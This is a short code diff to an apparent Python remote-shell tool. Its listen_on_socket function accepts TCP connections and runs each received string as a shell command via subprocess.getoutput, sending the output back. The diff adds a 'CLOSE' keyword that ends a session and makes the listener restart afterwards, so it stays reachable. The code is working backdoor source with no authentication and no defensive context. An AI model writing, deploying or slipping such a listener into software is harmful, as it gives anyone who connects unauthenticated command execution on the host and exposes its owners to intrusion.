@@ -16,9 +16,15 @@ def listen_on_socket(target_ip, target_port):
 
     while True:
         recieved_data = client_socket.recv(4096)
+        if recieved_data.decode("utf-8") == "CLOSE":
+            print(f"Closing Connection with {client_address}")
+            break
         command_output = subprocess.getoutput(recieved_data.decode("utf-8"))
         client_socket.send(bytes(command_output, "utf-8"))
     
+    tcp_server.close()
+    main()
+
 def main():
     try:
         my_target = sys.argv[1]
